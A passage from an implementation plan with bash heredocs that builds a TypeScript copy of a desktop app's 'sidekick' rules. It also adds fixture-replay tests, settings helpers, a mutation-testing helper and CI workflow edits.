playwright-cli -s=f1 screenshot --filename="$3.png" > /dev/null && echo "$3.png"
EOF
echo "shot.sh written"
```

Expected: `shot.sh written`.

---

**The "prove it bites" helper** (written once, here; every proof step below calls it). It changes one line, runs the given test files, prints the pass and fail counts and puts the file back; it refuses a change whose find text does not occur exactly once.

```bash
cat > .claude/checkpoints/f1-tauri/mut.py <<'EOF'
import sys, subprocess, shutil, os
# usage, from windows/: python3 ../.claude/checkpoints/f1-tauri/mut.py <file> <find> <replace> <test files...>
path, old, new, tests = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4:]
s = open(path).read()
assert s.count(old) == 1, (path, old[:60], s.count(old))
keep = path + ".mut-keep"
shutil.copy(path, keep)
open(path, "w").write(s.replace(old, new))
try:
    out = subprocess.run(["node", "--experimental-strip-types", "--test"] + tests, capture_output=True, text=True).stdout
    line = [l for l in out.splitlines() if l.startswith("# pass") or l.startswith("# fail")]
    print(os.path.basename(path), "|", new[:48].replace("\n", " "), "|", " ".join(line))
finally:
    shutil.move(keep, path)
EOF
echo "helper written"
```

Expected: `helper written`.

---

# Stage 1: the rules, the settings and the relay

### Task 1: The contract's rules in TypeScript

**Files:**
- Create: `scripts/gen-sidekick-ts.mjs`, `windows/src/sidekick/core.generated.ts` (written by the generator, never by hand), `windows/src/sidekick/core.ts`
- Create: `windows/scripts/sidekick-tests/util.mjs`, `fixtures.test.mjs`, `fresh.test.mjs`
- Modify: `windows/package.json` (`check:sidekick`), `.github/workflows/windows-tests.yml`

**Interfaces:**
- Consumes: `shared/sidekick-core.js` and the ten files of `tests/fixtures/sidekick/` (F1-0).
- Produces: `windows/src/sidekick/core.ts`, which every later task imports: `explain`, `eventFrom`, `approvalAnsweredEvent`, `emptyLedger`, `ledgerApply`, `ledgerPrune`, `liveSessions`, `stuckStep`, `markNudged`, `nudgeText`, `recapOf`, `statusOf`, `matchStatusQuestion`, `cleanDismissals`, `dismiss`, `muted`, `unmute`, `cleanSidekickSettings`, `presenceInit`, `presenceStep`, `shouldShow`, `acceptNicerLine`, `agentName`, `baseName`, the constants `REASONS`, `STUCK`, `RECAP`, `NUDGE_KINDS`, `DISMISS_KINDS`, `MUTE_AT`, `IDLE`, `HOLD_MS`, `NOTE_GAP_MS`, `RING_MAX`, and the types `Ledger`, `Session`, `SidekickEvent`, `Nudge`, `StuckContext`, `Recap`, `RecapFacts`, `PresenceState`, `PresenceSignal`, `Dismissals`, `SidekickSettings`, `ShowInput`, `Explained`, `Risk`, `NoteKind`, `NudgeKind`, `Platform`. And `npm run check:sidekick`, which every later task extends.

**Why a generated copy and not a hand-made port** (the owner's answer, 2026-10-14): the rules are 1000 lines of dense shell parsing and secret-name tables, and the fixtures are generated from them, so a second hand-made port can only add drift. The page already supports being loaded without Node (`globalThis.SidekickCore`), and the theme already works this way (`gen-theme.mjs`). The fixtures are still replayed against the copy, in the app's own module system (Node reading TypeScript, the same way Vite will bundle it), and a test fails if the copy is stale.

- [ ] **Step 1: Write the tests, and `check:sidekick`**

`util.mjs` is the fixture loader, `fixtures.test.mjs` replays all ten files, `fresh.test.mjs` fails on a stale copy. Nothing they import exists yet.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/util.mjs <<'EOF'
// Shared by the sidekick checks: the fixture loader. The fixtures in tests/fixtures/sidekick/ are generated from shared/sidekick-core.js (docs/SIDEKICK-CONTRACT.md).
import fs from "node:fs";

/** One fixture file of tests/fixtures/sidekick/, parsed. */
export const load = (name) =>
  JSON.parse(fs.readFileSync(new URL(`../../../tests/fixtures/sidekick/${name}`, import.meta.url), "utf8"));

/** A file of windows/src/, as text (for the wiring checks that pin where the app calls the pure parts). */
export const source = (rel) => fs.readFileSync(new URL(`../../src/${rel}`, import.meta.url), "utf8");
EOF
```

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/fixtures.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import * as core from "../../src/sidekick/core.ts";
import { load } from "./util.mjs";

// Every fixture of tests/fixtures/sidekick/ replayed against the app's own copy of the rules (src/sidekick/core.ts), in the app's own language.
// The cases are the contract's: shared/sidekick-core.js decides, and a disagreement here is the app's bug.

test("explain: every row of explain-cases.json gives its risk, reason, line and target", () => {
  const fx = load("explain-cases.json");
  assert.ok(fx.cases.length >= 500, `${fx.cases.length} cases`);
  assert.deepEqual(core.REASONS.map((r) => ({ id: r.id, risk: r.risk, line: r.line })), fx.reasons);
  for (const c of fx.cases) {
    const got = core.explain(c.agent, c.tool ?? undefined, c.input ?? undefined, c.cwd, c.home);
    assert.deepEqual([got.risk, got.reasonId, got.line, got.target], [c.risk, c.reasonId, c.line, c.target], c.name);
  }
});

test("eventFrom and ledgerApply: every payload gives its event, every sequence its ledger", () => {
  const fx = load("hook-cases.json");
  for (const c of fx.cases) assert.deepEqual(core.eventFrom(c.payload, c.now, c.opts), c.event, c.name);
  for (const s of fx.sequences) {
    let ledger = core.emptyLedger();
    for (const st of s.steps) {
      const ev = st.answered ? core.approvalAnsweredEvent(st.answered.agentId, st.answered.sessionId, st.at) : core.eventFrom(st.payload, st.at, st.opts);
      ledger = core.ledgerApply(ledger, ev);
    }
    assert.deepEqual(ledger, s.ledger, s.name);
  }
});

test("stuckStep and nudgeText: every timeline gives its nudge, deadline and words", () => {
  const fx = load("stuck-cases.json");
  assert.deepEqual(core.STUCK, fx.thresholds);
  assert.deepEqual(core.NUDGE_KINDS, fx.kinds);
  for (const c of fx.cases) {
    let ledger = core.emptyLedger();
    for (const st of c.steps) {
      if (st.payload) { ledger = core.ledgerApply(ledger, core.eventFrom(st.payload, st.at)); continue; }
      const ctx = st.probe.ctx, r = core.stuckStep(ledger, st.at, ctx);
      assert.equal(r.nudge ? r.nudge.kind : null, st.expect, `${c.name} @${st.at}`);
      if (st.nextAt !== undefined) assert.equal(r.nextAt, st.nextAt, `${c.name} @${st.at} nextAt`);
      if (st.text !== undefined) assert.equal(r.nudge ? core.nudgeText(r.nudge, ledger, st.at, ctx) : null, st.text, `${c.name} @${st.at} words`);
      if (st.probe.mark && r.nudge) ledger = core.markNudged(ledger, r.nudge.key, st.at);
    }
  }
});

test("recapOf, statusOf and matchStatusQuestion: every snapshot and every message gives what it records", () => {
  const recap = load("recap-cases.json"), status = load("status-cases.json");
  assert.equal(core.RECAP.MIN_AWAY_MS, recap.min);
  for (const c of recap.cases) assert.deepEqual(core.recapOf(c.snapshot), c.recap, c.name);
  for (const c of status.cases) assert.deepEqual(core.statusOf(c.snapshot, c.agent), c.status, c.name);
  for (const m of status.matcher) assert.deepEqual(core.matchStatusQuestion(m.text), { matched: m.matched, agentId: m.agentId }, JSON.stringify(m.text));
});

test("dismiss, unmute and cleanSidekickSettings: every operation and every stored value gives what it records", () => {
  const dismiss = load("dismiss-cases.json"), settings = load("settings-cases.json");
  assert.deepEqual(core.DISMISS_KINDS, dismiss.kinds);
  assert.equal(core.MUTE_AT, dismiss.muteAt);
  for (const c of dismiss.cases) {
    let state = c.start;
    c.ops.forEach((o, i) => {
      state = core[o.op](state, o.kind);
      assert.deepEqual([state, core.DISMISS_KINDS.filter((k) => core.muted(state, k))], [c.trail[i].state, c.trail[i].muted], c.name);
    });
  }
  for (const c of settings.cases) assert.deepEqual(core.cleanSidekickSettings(c.raw), c.clean, c.name);
});

test("presenceStep and shouldShow: every signal and every gate input gives what it records", () => {
  const presence = load("presence-cases.json"), show = load("show-cases.json");
  assert.deepEqual(core.IDLE, presence.idle);
  assert.deepEqual(core.HOLD_MS, show.holdMs);
  assert.equal(core.NOTE_GAP_MS, show.noteGapMs);
  for (const c of presence.cases) {
    let state = c.start;
    for (const st of c.steps) {
      const r = core.presenceStep(state, st.signal, st.at);
      assert.deepEqual(r, { state: st.state, back: st.back }, `${c.name} @${st.at}`);
      state = r.state;
    }
  }
  for (const c of show.cases) assert.deepEqual(core.shouldShow(c.input), c.show, c.name);
});

test("acceptNicerLine: every sentence is accepted or refused as it records", () => {
  const fx = load("voice-cases.json");
  for (const c of fx.cases) assert.equal(core.acceptNicerLine(c.line, c.facts), c.ok, c.name);
});

test("a number that is not a number never gets through: NaN and Infinity in the times, the counts and the facts", () => {
  const ev = core.eventFrom({ hook_event_name: "PostToolUse", session_id: "S", tool_name: "Bash", tool_input: { command: "ls" } }, 1000);
  assert.ok(ev);
  assert.equal(core.eventFrom({ hook_event_name: "PostToolUse", session_id: "S" }, Number.NaN), null);
  assert.equal(core.eventFrom({ hook_event_name: "PostToolUse", session_id: "S" }, Number.POSITIVE_INFINITY), null);
  const ledger = core.ledgerApply(core.emptyLedger(), ev);
  assert.deepEqual(core.stuckStep(ledger, Number.NaN, {}), { nudge: null, nextAt: null });
  assert.equal(core.recapOf({ awaySince: Number.NaN, now: 1e9, sessions: ledger.sessions }), null);
  assert.equal(core.recapOf({ awaySince: 0, now: Number.POSITIVE_INFINITY, sessions: ledger.sessions }), null);
  assert.equal(core.presenceStep(core.presenceInit(), { type: "idle", seconds: Number.POSITIVE_INFINITY }, 1000).back, false);
  assert.equal(core.acceptNicerLine("Claude Code ran 3 steps.", [{ agent: "Claude Code", steps: Number.POSITIVE_INFINITY }]), false);
  assert.equal(core.acceptNicerLine("Claude Code ran 3 steps.", [{ agent: "Claude Code", steps: 3 }]), true);
});
EOF
```

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/fresh.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { OUTPUT, SOURCE, render } from "../../../scripts/gen-sidekick-ts.mjs";

// The app does not carry a second hand-made port of the rules: it carries a copy that scripts/gen-sidekick-ts.mjs writes from shared/sidekick-core.js.
// If the source changes and the copy is not written again, this fails (the same job as `gen-theme.mjs --check`).

test("src/sidekick/core.generated.ts is exactly what the generator writes from shared/sidekick-core.js", () => {
  const source = fs.readFileSync(SOURCE, "utf8");
  const have = fs.readFileSync(OUTPUT, "utf8");
  assert.equal(have, render(source), "run `node scripts/gen-sidekick-ts.mjs` from the repository root and commit the result");
});

test("the generated copy says it is generated, and the rules in it are the source's, byte for byte", () => {
  const source = fs.readFileSync(SOURCE, "utf8").replace(/\s+$/, "");
  const have = fs.readFileSync(OUTPUT, "utf8");
  assert.ok(have.startsWith("// GENERATED by scripts/gen-sidekick-ts.mjs"), "its first line");
  assert.ok(have.includes(source), "the source is in it, whole");
});
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/package.json", r'''    "check:cat": "node --experimental-strip-types --test --test-reporter=spec scripts/cat-tests/*.test.mjs",
''', r'''    "check:cat": "node --experimental-strip-types --test --test-reporter=spec scripts/cat-tests/*.test.mjs",
    "check:sidekick": "node --experimental-strip-types --test --test-reporter=spec scripts/sidekick-tests/*.test.mjs",
''')
PY
```

- [ ] **Step 2: Run them to see them fail**

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 3: Write the generator, the types, and run the generator**

The generator wraps the UMD file as an ES module (`const module = {exports: {}}` in front, `export const SidekickCore = module.exports` behind) and refuses nothing: its `--check` is what `fresh.test.mjs` and CI call. `core.ts` is erasable TypeScript: types and `as` casts only.

```bash
mkdir -p scripts
cat > scripts/gen-sidekick-ts.mjs <<'EOF'
#!/usr/bin/env node
// Writes the TypeScript copy of the sidekick's rules from shared/sidekick-core.js (sub-project F1, docs/SIDEKICK-CONTRACT.md):
//   windows/src/sidekick/core.generated.ts   (Windows and Linux)
// The rules are written once. The Windows and Linux app does not carry a second, hand-made port of them: it carries this generated copy, so the two cannot drift,
// and `npm run check:sidekick` replays every fixture of tests/fixtures/sidekick/ against it, in the app's own language.
//   node scripts/gen-sidekick-ts.mjs            write it
//   node scripts/gen-sidekick-ts.mjs --check    write nothing; exit 1 if the file differs from what would be written (CI)
// Node standard library only.
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
export const SOURCE = path.join(ROOT, 'shared/sidekick-core.js');
export const OUTPUT = path.join(ROOT, 'windows/src/sidekick/core.generated.ts');

const HEAD = [
  '// GENERATED by scripts/gen-sidekick-ts.mjs from shared/sidekick-core.js. Do not edit: change the source and run `node scripts/gen-sidekick-ts.mjs`.',
  "// The source is a UMD file; here it runs as an ES module, with a `module` of its own to export through. The typed names are in core.ts.",
  '// @ts-nocheck',
  'const module: { exports: any } = { exports: {} };',
].join('\n');

/** The text of the generated file for a given source text. */
export function render(source) {
  return `${HEAD}\n${source.replace(/\s+$/, '')}\nexport const SidekickCore = module.exports;\n`;
}

function main() {
  const want = render(fs.readFileSync(SOURCE, 'utf8'));
  const have = fs.existsSync(OUTPUT) ? fs.readFileSync(OUTPUT, 'utf8') : null;
  if (process.argv.includes('--check')) {
    if (have === want) { console.log('✓ windows/src/sidekick/core.generated.ts matches shared/sidekick-core.js'); return; }
    console.error('✗ windows/src/sidekick/core.generated.ts is stale: run `node scripts/gen-sidekick-ts.mjs`');
    process.exit(1);
  }
  fs.mkdirSync(path.dirname(OUTPUT), { recursive: true });
  if (have !== want) fs.writeFileSync(OUTPUT, want);
  console.log(`${have === want ? 'unchanged' : 'wrote'} windows/src/sidekick/core.generated.ts`);
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) main();
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/core.ts <<'EOF'
// The sidekick contract's rules, typed (docs/SIDEKICK-CONTRACT.md). The rules themselves are shared/sidekick-core.js, copied by scripts/gen-sidekick-ts.mjs into
// core.generated.ts; this file gives them their types and nothing else. Pure: no clock, no network, no files. Every rule is given the time it needs.
// Loaded by the plain-Node checks (npm run check:sidekick): erasable TypeScript only, relative imports with the `.ts` extension.

import { SidekickCore } from "./core.generated.ts";

export type Risk = "low" | "medium" | "high";
export interface Explained { risk: Risk; reasonId: string; line: string; target: string }

export type EventKind =
  | "sessionStart" | "prompt" | "preTool" | "question" | "tool" | "failure" | "approvalAsked" | "approvalAnswered"
  | "stop" | "stopFailure" | "subagentStart" | "subagentStop" | "sessionEnd" | "notification";
export interface SidekickEvent {
  at: number; agentId: string; sessionId: string; kind: EventKind; name: string; tool: string; target: string; file: string; key: string; ok: boolean; project: string; subagentId: string;
}
export interface RingEntry { at: number; kind: string; tool: string; target: string; file: string; key: string; ok: boolean }
export interface Session {
  key: string; agentId: string; sessionId: string; startedAt: number; lastEventAt: number; endedAt: number | null; state: string; last: string; project: string;
  ring: RingEntry[]; pendingApprovalAt: number | null; pendingKey: string | null; subagents: Record<string, number>; nudgedAt: number | null;
}
export interface Ledger { sessions: Session[] }

export type NudgeKind = "stuck.loop" | "stuck.errors" | "stuck.waiting" | "stuck.silent";
export type NoteKind = "recap" | NudgeKind;
export interface Nudge { kind: NudgeKind; reasonId: string; key: string; agentId: string }
export type Platform = "mac" | "windows" | "linux";
/** What `stuckStep` and `nudgeText` are told about the world. All false (and the Mac) when absent. */
export interface StuckContext { ratelimit?: boolean; away?: boolean; cardShown?: boolean; platform?: Platform }
export interface StuckResult { nudge: Nudge | null; nextAt: number | null }

export interface RecapFacts {
  agent: string; agentId: string; project: string; steps: number; stepsAtLeast: boolean; files: string[]; more: number; errors: number; approvals: number; end: string; quietMinutes: number;
}
export interface Recap { lines: string[]; facts: RecapFacts[] }
export interface Snapshot { awaySince?: number; now: number; sessions: Session[] }
export interface StatusQuestion { matched: boolean; agentId: string | null }

export interface PresenceState { reasons: string[]; awaySince: number | null; wasAway: boolean }
export type PresenceSignal =
  | { type: "lock" | "unlock" | "sleep" | "wake" | "displayOff" | "displayOn" }
  | { type: "idle"; seconds: number };
export interface PresenceResult { state: PresenceState; back: false | { back: true; awaySince: number; awayMs: number } }

export type Dismissals = Record<NoteKind, number>;
/** The stored `sidekick` object: the master switch, the local-voice switch and the dismissal counts. */
export interface SidekickSettings { on: boolean; local: boolean; dismissals: Dismissals }

export interface ShowInput {
  on?: boolean; kind: string; dismissals?: unknown; away?: boolean; ratelimit?: boolean; card?: "approval" | "question" | null; ownCard?: boolean; inputFocused?: boolean;
  visible?: { kind: string; seen: boolean } | null; lastShownAt?: number | null; now: number; nudged?: boolean; recapGiven?: boolean;
}
export interface ShowResult { show: boolean; reason: string; replace: boolean }

export const explain = SidekickCore.explain as (agent: string, tool: string, toolInput: unknown, cwd: string, home: string) => Explained;
export const eventFrom = SidekickCore.eventFrom as (payload: unknown, now: number, opts?: { codex?: boolean }) => SidekickEvent | null;
export const approvalAnsweredEvent = SidekickCore.approvalAnsweredEvent as (agentId: string, sessionId: string, now: number) => SidekickEvent;
export const emptyLedger = SidekickCore.emptyLedger as () => Ledger;
export const ledgerApply = SidekickCore.ledgerApply as (ledger: Ledger, event: SidekickEvent) => Ledger;
export const ledgerPrune = SidekickCore.ledgerPrune as (ledger: Ledger, now: number) => Ledger;
export const liveSessions = SidekickCore.liveSessions as (ledger: Ledger) => Session[];
export const aliveSubagents = SidekickCore.aliveSubagents as (session: Session) => number;
export const stuckStep = SidekickCore.stuckStep as (ledger: Ledger, now: number, ctx?: StuckContext) => StuckResult;
export const markNudged = SidekickCore.markNudged as (ledger: Ledger, key: string, now: number) => Ledger;
export const nudgeText = SidekickCore.nudgeText as (nudge: Nudge, ledger: Ledger, now: number, ctx?: StuckContext) => string;
export const recapOf = SidekickCore.recapOf as (snapshot: Snapshot) => Recap | null;
export const statusOf = SidekickCore.statusOf as (snapshot: Snapshot, agentId?: string | null) => Recap;
export const matchStatusQuestion = SidekickCore.matchStatusQuestion as (text: string) => StatusQuestion;
export const cleanDismissals = SidekickCore.cleanDismissals as (raw: unknown) => Dismissals;
export const dismiss = SidekickCore.dismiss as (state: unknown, kind: string) => Dismissals;
export const muted = SidekickCore.muted as (state: unknown, kind: string) => boolean;
export const unmute = SidekickCore.unmute as (state: unknown, kind: string) => Dismissals;
export const cleanSidekickSettings = SidekickCore.cleanSidekickSettings as (raw: unknown) => SidekickSettings;
export const presenceInit = SidekickCore.presenceInit as () => PresenceState;
export const presenceStep = SidekickCore.presenceStep as (state: PresenceState | null, signal: PresenceSignal, now: number) => PresenceResult;
export const shouldShow = SidekickCore.shouldShow as (input: ShowInput) => ShowResult;
export const acceptNicerLine = SidekickCore.acceptNicerLine as (line: unknown, facts: unknown) => boolean;
export const agentName = SidekickCore.agentName as (agentId: string) => string;
export const baseName = SidekickCore.baseName as (path: string) => string;

export const REASONS = SidekickCore.REASONS as readonly { id: string; risk: Risk; line: string }[];
export const STUCK = SidekickCore.STUCK as { LOOP_CALLS: number; LOOP_SAME: number; WINDOW_MS: number; ERRORS: number; WAIT_MS: number; SILENT_MS: number; SILENT_PRE_MS: number; KITTEN_MS: number; GIVE_UP_MS: Record<Platform, number> };
export const RECAP = SidekickCore.RECAP as { MIN_AWAY_MS: number; MAX_LINES: number; MAX_FILES: number; STATUS_FINISHED_MS: number };
export const NUDGE_KINDS = SidekickCore.NUDGE_KINDS as readonly NudgeKind[];
export const DISMISS_KINDS = SidekickCore.DISMISS_KINDS as readonly NoteKind[];
export const MUTE_AT = SidekickCore.MUTE_AT as number;
export const IDLE = SidekickCore.IDLE as { AWAY_S: number; BACK_S: number };
export const HOLD_MS = SidekickCore.HOLD_MS as { nudge: number; recap: number };
export const NOTE_GAP_MS = SidekickCore.NOTE_GAP_MS as number;
export const RING_MAX = SidekickCore.RING_MAX as number;
EOF
```

```bash
node scripts/gen-sidekick-ts.mjs
```

Expected: `wrote windows/src/sidekick/core.generated.ts`.

- [ ] **Step 4: Run them to see them pass, and the type check**

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 10`, `ℹ pass 10`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
node scripts/gen-sidekick-ts.mjs --check
```

Expected: `matches shared/sidekick-core.js`.

- [ ] **Step 5: Prove the replay and the freshness check bite**

A threshold changed in the copy must fail the fixtures (the stuck timeline) and the freshness test at once.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/core.generated.ts "WAIT_MS: 60000" "WAIT_MS: 61000" scripts/sidekick-tests/fixtures.test.mjs scripts/sidekick-tests/fresh.test.mjs )
```

Expected: `# fail 3`.

- [ ] **Step 6: Run the pipeline on CI's side**

`windows-tests.yml` runs on `windows/**` and now also on the fixtures, the core and the generator; it runs `npm run check:sidekick` after the Claude Code chat checks. (`linux.yml` runs only `cargo test`.)

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit(".github/workflows/windows-tests.yml", r'''      - 'tests/fixtures/cat/**'
''', r'''      - 'tests/fixtures/cat/**'
      - 'tests/fixtures/sidekick/**'
      - 'shared/sidekick-core.js'
      - 'scripts/gen-sidekick-ts.mjs'
''')
edit(".github/workflows/windows-tests.yml", r'''      - name: Claude Code chat checks
        run: npm run check:claude
''', r'''      - name: Claude Code chat checks
        run: npm run check:claude
      - name: Sidekick checks
        run: npm run check:sidekick
''')
PY
```

```bash
git diff --stat -- .github/workflows/windows-tests.yml windows/package.json
```

Expected: `windows-tests.yml`, `package.json`.

- [ ] **Step 7: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add scripts/gen-sidekick-ts.mjs windows/src/sidekick windows/scripts/sidekick-tests windows/package.json .github/workflows/windows-tests.yml
git commit -F - <<'MSG'
feat(sidekick): the contract's rules in TypeScript, replayed from tests/fixtures/sidekick

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 2: The `sidekick` settings, kept at every save

**Files:**
- Create: `windows/src/sidekick/settings.ts`, `windows/src/settings/sidekick.ts`, `windows/src-tauri/src/sidekick_settings.rs`, `windows/scripts/sidekick-tests/settings.test.mjs`
- Modify: `windows/src/core/state.ts` (`Settings.sidekick`), `windows/src/settings/main.ts` (the section), `windows/src-tauri/src/lib.rs` (`mod`), `windows/src-tauri/src/settings.rs` (the field, the default, `sanitized`)

**Interfaces:**
- Consumes: Task 1's `cleanSidekickSettings`, `dismiss`, `unmute`, `muted`, `DISMISS_KINDS`, `SidekickSettings`, `NoteKind`.
- Produces: `KIND_LABELS`, `defaultSidekick()`, `withSidekickOn(s, on)`, `withLocal(s, local)`, `withDismissed(s, kind)`, `withUnmuted(s, kind)`, `mutedKinds(s)` (`sidekick/settings.ts`); `State.settings.sidekick: SidekickSettings` (always clean, `DEFAULT_SETTINGS.sidekick` is the default); `sidekickSection(host)` (`settings/sidekick.ts`, with an optional `found()` that Task 12 fills); Rust `clean_sidekick(&Value) -> Value`, `default_value()`, `clean_dismissals`, `KINDS`, and `Settings.sidekick: serde_json::Value`.

The `sidekick` object sits beside the `cat` block in `settings.json` as `{on, local, dismissals}`. It is held as a JSON value in Rust, as the `cat` block is, so that **one bad field can never fail the whole file**; `sanitized` runs it through the clean-up on load and on every save (`save_settings` calls `sanitized`), which is what keeps it at every save.

- [ ] **Step 1: Write the TypeScript test**

It checks the helpers, the default in `DEFAULT_SETTINGS`, and, by source pins, how the Settings window shows the section: between Cat and General, built from the window's own rows, no timer, cleaned at start and following the island's changes.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/settings.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { DISMISS_KINDS } from "../../src/sidekick/core.ts";
import { KIND_LABELS, defaultSidekick, mutedKinds, withDismissed, withLocal, withSidekickOn, withUnmuted } from "../../src/sidekick/settings.ts";
import { DEFAULT_SETTINGS } from "../../src/core/state.ts";
import { source } from "./util.mjs";

test("a fresh install has everything on and nothing dismissed, in the app's settings too", () => {
  assert.deepEqual(defaultSidekick(), { on: true, local: true, dismissals: { recap: 0, "stuck.loop": 0, "stuck.errors": 0, "stuck.waiting": 0, "stuck.silent": 0 } });
  assert.deepEqual(DEFAULT_SETTINGS.sidekick, defaultSidekick());
});

test("the switches change one thing each, and a dismissal changes only its own kind", () => {
  const s = defaultSidekick();
  assert.deepEqual(withSidekickOn(s, false), { ...s, on: false });
  assert.deepEqual(withLocal(s, false), { ...s, local: false });
  assert.deepEqual(withDismissed(s, "recap").dismissals, { ...s.dismissals, recap: 1 });
  assert.deepEqual(withDismissed(withDismissed(s, "stuck.loop"), "stuck.loop").dismissals["stuck.loop"], 2);
  assert.deepEqual(withDismissed(withDismissed(withDismissed(s, "stuck.loop"), "stuck.loop"), "stuck.loop").dismissals["stuck.loop"], 2, "never above 2");
  assert.deepEqual(withDismissed(s, "bogus"), s, "a word that is not one of the five kinds changes nothing");
});

test("two dismissals mute a kind, Unmute sets it back to 0, and the muted rows come in the contract's order", () => {
  let s = defaultSidekick();
  assert.deepEqual(mutedKinds(s), []);
  for (const k of ["stuck.silent", "recap", "stuck.silent", "recap", "stuck.errors"]) s = withDismissed(s, k);
  assert.deepEqual(mutedKinds(s), ["recap", "stuck.silent"], "stuck.errors was dismissed once: not muted");
  s = withUnmuted(s, "recap");
  assert.deepEqual(mutedKinds(s), ["stuck.silent"]);
  assert.equal(s.dismissals.recap, 0);
  assert.equal(s.dismissals["stuck.errors"], 1, "Unmute touches its own kind only");
});

test("every kind has a row label, in the spec's words", () => {
  assert.deepEqual(Object.keys(KIND_LABELS), [...DISMISS_KINDS]);
  assert.deepEqual(Object.values(KIND_LABELS), ["Away recaps", "Repeated steps", "Repeated errors", "Waiting for your OK", "Gone quiet"]);
});

test("the Settings window shows the Sidekick section between Cat and General, cleans the object at start and follows the island's changes", () => {
  const main = source("settings/main.ts");
  assert.match(main, /settings\.sidekick = cleanSidekickSettings\(settings\.sidekick\);/);
  assert.ok(main.indexOf("cat.el,") < main.indexOf("sidekick.el,") && main.indexOf("sidekick.el,") < main.indexOf("generalSection(),"));
  assert.match(main, /put: \(next\) => \{\s*settings\.sidekick = next;\s*void save\(\);\s*sidekick\.sync\(\);/);
  assert.match(main, /cat\.sync\(\);\s*sidekick\.sync\(\);/);
});

test("the section uses the window's own rows and the spec's words, and runs no timer of its own", () => {
  const sk = source("settings/sidekick.ts");
  for (const s of ["Recaps and nudges", "Nicer wording from a local model", "Nothing is muted", "Muted notes", "Unmute", "Permission explanations are always on.", "No local model found", "Found: "]) assert.ok(sk.includes(s), s);
  for (const cls of [...sk.matchAll(/class: "([^"]+)"/g)].flatMap((m) => m[1].split(" "))) assert.ok(["row", "hint", "switch", "on"].includes(cls), `a class that is not the window's own: ${cls}`);
  assert.doesNotMatch(sk, /setInterval|setTimeout|requestAnimationFrame/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write the helpers, the section and the edits**

The section keeps no state of its own: it reads the settings from its host and hands every change back through the clean-up. Its rows are the window's `.row`, `.switch` and `.hint`; no new CSS class.

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/settings.ts <<'EOF'
// The Sidekick settings as the app edits them (sub-project F1, spec "Settings" and "Dismissal memory"): the master switch, the local-voice switch and the dismissal
// counts of the five kinds of note. Every change goes through the contract's clean-up (`cleanSidekickSettings`), so a value that is not one of the allowed ones never
// gets stored. Pure: the Settings window and the island both call these, and the plain-Node checks load this file.

import { DISMISS_KINDS, cleanSidekickSettings, dismiss, muted, unmute } from "./core.ts";
import type { NoteKind, SidekickSettings } from "./core.ts";

/** The words Settings → Sidekick uses for each kind of note (the spec's "Muted notes" rows). */
export const KIND_LABELS: Record<NoteKind, string> = {
  recap: "Away recaps",
  "stuck.loop": "Repeated steps",
  "stuck.errors": "Repeated errors",
  "stuck.waiting": "Waiting for your OK",
  "stuck.silent": "Gone quiet",
};

/** What a fresh install holds: everything on, nothing dismissed. */
export const defaultSidekick = (): SidekickSettings => cleanSidekickSettings(null);

/** "Recaps and nudges": off means no recap and no stuck nudge. The permission line has no switch. */
export const withSidekickOn = (s: SidekickSettings, on: boolean): SidekickSettings => cleanSidekickSettings({ ...s, on });

/** "Nicer wording from a local model": off means only the plain templates. */
export const withLocal = (s: SidekickSettings, local: boolean): SidekickSettings => cleanSidekickSettings({ ...s, local });

/** One more dismissal of a kind (a click on Not now, OK or ×). Two mute it. */
export const withDismissed = (s: SidekickSettings, kind: NoteKind): SidekickSettings => cleanSidekickSettings({ ...s, dismissals: dismiss(s.dismissals, kind) });

/** Unmute in Settings: that kind goes back to 0. */
export const withUnmuted = (s: SidekickSettings, kind: NoteKind): SidekickSettings => cleanSidekickSettings({ ...s, dismissals: unmute(s.dismissals, kind) });

/** The kinds that are muted now, in the contract's order: the rows under "Muted notes". */
export const mutedKinds = (s: SidekickSettings): NoteKind[] => DISMISS_KINDS.filter((k) => muted(s.dismissals, k));
EOF
```

```bash
mkdir -p windows/src/settings
cat > windows/src/settings/sidekick.ts <<'EOF'
// Settings → Sidekick (sub-project F1, spec "Settings"): the master switch, the local-voice switch with its "Found" line, the muted notes with an Unmute button each, and
// the note that the permission explanations are always on. Built from the Settings window's own rows (.row, .switch, .hint, button): no new CSS class.
